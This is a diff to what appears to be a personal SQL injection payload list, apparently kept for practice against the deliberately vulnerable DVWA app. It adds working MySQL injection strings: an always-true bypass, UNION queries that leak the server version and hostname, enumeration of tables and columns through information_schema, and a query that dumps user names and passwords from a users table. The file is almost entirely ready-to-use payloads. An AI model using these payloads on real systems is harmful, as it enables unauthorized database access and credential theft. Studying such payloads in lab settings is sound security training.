@@ -5,15 +5,17 @@ PAYLOADS
 BASICS
 '
 test' or 1=1#
+
+Version details
+'  UNION SELECT @@version#
+'  UNION SELECT 1,@@version#
+Hostname
+'  UNION SELECT 1,@@hostname#
+
+Column details
+%' or '0'='0' union select COLUMN_NAME from information_schema.COLUMNS #
+%' or '0'='0' union select TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS #
+%' or '0'='0' union select TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = 'users' #
+
+Password 
 ’ or 1=1 UNION SELECT user, password from dvwa.users#
-
-
-
-
-
-
-
-
-
-
-
